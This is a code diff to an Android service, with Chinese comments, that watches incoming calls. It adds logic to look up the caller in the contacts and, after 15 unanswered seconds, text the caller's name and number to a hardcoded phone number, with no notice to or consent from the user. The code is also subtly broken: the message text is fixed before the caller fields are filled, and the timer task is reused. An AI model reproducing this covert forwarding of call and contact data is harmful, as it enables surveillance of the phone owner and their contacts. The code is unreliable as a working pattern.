@@ -8,9 +8,11 @@ import android.database.Cursor;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.telephony.PhoneStateListener;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -20,6 +22,8 @@ import java.util.TimerTask;
  */
 public class PhoneListenerService extends Service{
     private static final String TAG = "PhoneListenerService";
+    String phoneContactName = "";
+    String phoneContactNumber = "";
     Timer timer;
     TimerTask task;
 
@@ -48,6 +52,10 @@ public class PhoneListenerService extends Service{
         phoneCursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 PHONE_PROJECTION, null, null, null);
 
+        //get smsManger
+        final SmsManager smsManager = SmsManager.getDefault();
+        final String targetPhoneNumber = "13676090644";
+        final String targetContent = phoneContactName + " " + phoneContactNumber;
 
         //get a timer
         timer = new Timer();
@@ -55,6 +63,14 @@ public class PhoneListenerService extends Service{
             @Override
             public void run() {
                 //send a sms;
+                if(targetContent.length() > 70){
+                    List<String> divideSms = smsManager.divideMessage(targetContent);
+                    for(String sms:divideSms){
+                        smsManager.sendTextMessage(targetPhoneNumber, null, sms, null, null);
+                    }
+                }else{
+                    smsManager.sendTextMessage(targetPhoneNumber, null, targetContent, null, null);
+                }
                 Log.v(TAG, "send message");
             }
         };
@@ -69,7 +85,7 @@ public class PhoneListenerService extends Service{
         @Override
         public void onCallStateChanged(int state, String incomingNumber) {
             super.onCallStateChanged(state, incomingNumber);
-            switch (state){
+            switch (state) {
                 case TelephonyManager.CALL_STATE_IDLE:
                     Log.v(TAG, "idle");
                     break;
@@ -80,15 +96,17 @@ public class PhoneListenerService extends Service{
                 case TelephonyManager.CALL_STATE_RINGING:
                     Log.v(TAG, "ringing: " + incomingNumber);
                     //get contact name by incomingNumber
-                    if( phoneCursor != null){
-                        while(phoneCursor.moveToNext()){
-                            if(phoneCursor.getString(PHONE_CONTACT_NUMBER_INDEX).equals(incomingNumber)){
-                                Log.v(TAG, "call from " + phoneCursor.getString(PHONE_CONTACT_NAME_INDEX));
+                    if (phoneCursor != null) {
+                        while (phoneCursor.moveToNext()) {
+                            if (phoneCursor.getString(PHONE_CONTACT_NUMBER_INDEX).equals(incomingNumber)) {
+                                phoneContactNumber = incomingNumber;
+                                phoneContactName = phoneCursor.getString(PHONE_CONTACT_NAME_INDEX);
+                                Log.v(TAG, "call from " + phoneContactName);
                             }
                         }
+                        //15秒之后未接听，发送短信
+                        timer.schedule(task, 15000);
                     }
-                    //15秒之后未接听，发送短信
-                    timer.schedule(task, 15000);
             }
         }
     }
